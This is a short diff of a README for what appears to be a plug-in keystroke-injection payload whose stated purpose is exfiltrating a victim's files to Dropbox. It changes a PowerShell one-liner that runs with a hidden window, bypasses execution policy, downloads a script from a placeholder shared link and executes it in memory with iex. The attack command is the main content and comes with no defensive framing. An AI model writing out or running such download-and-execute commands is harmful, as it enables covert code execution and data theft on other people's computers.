@@ -42,7 +42,7 @@ Finally, dropbox will be used to exfiltrate the files to cloud storage
 * Plug in your device
 * Invoke-WebRequest will be entered in the Run Box to download and execute the script from memory
 ```
-powershell -w h -NoP -NonI -ep Bypass $pl = iwr < Your Shared link for the intended file> ?dl=1; iex $pl
+powershell -w h -NoP -NonI -ep Bypass iwr <Your Shared link for the intended file>?dl=1 | iex
 ```
 
 <p align="right">(<a href="#top">back to top</a>)</p>
